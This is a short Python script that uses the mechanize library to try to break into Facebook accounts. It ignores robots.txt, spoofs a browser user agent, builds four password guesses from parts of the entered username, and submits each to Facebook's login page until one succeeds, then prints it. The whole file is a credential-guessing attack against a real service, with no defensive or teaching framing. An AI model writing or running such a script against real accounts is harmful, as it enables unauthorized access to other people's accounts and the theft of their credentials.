import mechanize

br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]

usr = input("Enter user: ")

passw = [usr[:6], usr[5:], usr[:7], usr]

for i in range(4):
	br.open('https://www.facebook.com/login.php?login_attempt=1')
	br.select_form(nr=0)
	br.form['email'] = usr
	br.form['pass'] = passw[i]
	sub = br.submit()
	log = sub.geturl()
	if(log == 'https://www.facebook.com/'):
		print(passw[i])
		break;
	
